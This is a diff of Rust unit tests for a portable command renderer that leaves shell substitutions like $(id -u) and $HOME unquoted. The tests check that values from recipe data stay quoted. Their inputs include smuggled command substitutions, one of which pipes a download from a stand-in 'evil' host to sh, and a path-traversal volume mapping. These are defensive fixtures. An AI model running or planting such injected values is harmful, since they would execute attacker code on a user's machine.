@@ -126,7 +126,7 @@ fn rendering_is_deterministic_across_calls() {
 
 #[test]
 fn the_portable_rendering_keeps_host_specifics_symbolic() {
-    let portable = sample().display_portable(Some("/home/spark"));
+    let portable = sample().display_portable(Some("/home/spark"), "$HOME");
     assert!(
         portable.contains("$(id -u):$(id -g)"),
         "uid must stay symbolic"
@@ -175,16 +175,13 @@ fn omitted_options_emit_nothing() {
 fn portable_substitutions_are_emitted_unquoted_so_the_shell_expands_them() {
     // Quoting these would make the pasted command run as the literal string
     // "$(id -u)", which fails with an unusable uid — the exact bug this guards.
-    let portable = sample().display_portable(Some("/home/spark"));
+    let portable = sample().display_portable(Some("/home/spark"), "$HOME");
     assert!(
         portable.contains("--user $(id -u):$(id -g)"),
         "got: {portable}"
     );
     assert!(
-        portable.contains(&format!(
-            "-v {}/.cache/huggingface:/cache/huggingface",
-            crate::platform::home_placeholder()
-        )),
+        portable.contains("-v $HOME/.cache/huggingface:/cache/huggingface"),
         "got: {portable}"
     );
     assert!(
@@ -192,7 +189,7 @@ fn portable_substitutions_are_emitted_unquoted_so_the_shell_expands_them() {
         "the substitution must not be quoted"
     );
     assert!(
-        !portable.contains(&format!("'{}", crate::platform::home_placeholder())),
+        !portable.contains("'$HOME"),
         "the home substitution must not be quoted"
     );
 }
@@ -202,7 +199,7 @@ fn a_dollar_sign_from_recipe_data_is_still_quoted_in_the_portable_form() {
     // Only the substitutions this renderer produces are exempt from quoting.
     let mut c = sample();
     c.env.insert("EVIL".into(), "$(touch /tmp/pwned)".into());
-    let portable = c.display_portable(Some("/home/spark"));
+    let portable = c.display_portable(Some("/home/spark"), "$HOME");
     assert!(
         portable.contains(r"'EVIL=$(touch /tmp/pwned)'"),
         "recipe-supplied substitutions must stay inert: {portable}"
@@ -225,7 +222,7 @@ fn a_recipe_env_value_cannot_smuggle_a_command_substitution() {
         "LEAK".to_owned(),
         "$(id -u)$(curl -s http://evil/x|sh)".to_owned(),
     );
-    let portable = c.display_portable(Some("/home/spark"));
+    let portable = c.display_portable(Some("/home/spark"), "$HOME");
     // Quoted, not absent: the operator should still SEE what the recipe asked
     // for. What must not happen is the shell running it.
     assert!(
@@ -247,7 +244,7 @@ fn a_recipe_volume_that_looks_rewritten_is_still_quoted() {
     let mut c = sample();
     c.volumes
         .insert("$HOME/../../etc".to_owned(), "/mnt".to_owned());
-    let portable = c.display_portable(Some("/home/spark"));
+    let portable = c.display_portable(Some("/home/spark"), "$HOME");
     assert!(
         !portable.contains(" $HOME/../../etc:/mnt"),
         "a recipe-supplied $HOME escaped quoting: {portable}"
